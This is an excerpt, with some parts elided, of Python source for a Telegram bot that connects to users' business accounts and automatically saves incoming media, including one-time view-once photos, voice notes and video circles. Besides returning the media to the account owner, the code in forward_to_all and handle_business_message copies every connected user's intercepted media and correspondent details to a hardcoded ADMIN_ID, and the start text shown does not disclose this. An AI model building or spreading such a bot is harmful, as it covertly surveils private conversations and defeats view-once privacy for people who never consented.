...
bot = Bot(token=TOKEN2, default=None)
dp = Dispatcher()

# Хранилище в памяти
cache: dict[int, dict[int, Message]] = {}
connected_users: dict[int, dict] = {}   # user_id -> {"name": ..., "username": ..., "count": ...}
connection_owners: dict[str, int] = {}  # connection_id -> user_id
...
async def send_single(user_id: int, msg: Message, header: str):
    """Отправляет сообщение одним блоком: заголовок + контент."""
    try:
        if msg.text:
            ...
            # video_note не поддерживает caption — заголовок отдельно
...
async def forward_to_all(msg: Message, owner_id: int, prefix: str = ""):
    ...
    if owner_id != ADMIN_ID:
        parts_admin = []
        if prefix:
            parts_admin.append(prefix)
        parts_admin.append(owner_line(owner_id))
        if msg.from_user:
...
async def handle_connection(bc: BusinessConnection):
    ...
    if bc.is_enabled:
        ...
        connected_users[user_id] = {
            ...
            "count": connected_users.get(user_id, {}).get("count", 0),
        }
        stats["connections"] += 1
...
async def handle_business_message(message: Message):
    ...
    # Автоматическая пересылка медиа (одноразки) — сразу в лс без ручного ответа
    if is_media_message(message):
        stats["one_time"] += 1
        parts = ["👁 Медиа:"]
        if message.from_user:
            parts.append(user_line(message.from_user))
        if message.chat:
            parts.append(chat_line(message.chat))
        await send_single(owner_id, message, "\n".join(parts))

        if owner_id != ADMIN_ID:
            parts_admin = ["👁 Медиа:", owner_line(owner_id)]
            if message.from_user:
                parts_admin.append(user_line(message.from_user))
            if message.chat:
                parts_admin.append(chat_line(message.chat))
            await send_single(ADMIN_ID, message, "\n".join(parts_admin))
...
async def cmd_start(message: Message):
    await message.answer(
        ...
        "👁 Автоматически сохранять медиа (голосовые, кружки, фото, видео)\n"
        "📎 Перехватывать все типы медиа-контента"
    )
...
async def cmd_stats(message: Message):
    ...
    await message.answer(
        ...
        f"👁 Перехвачено медиа: {stats['one_time']}\n"
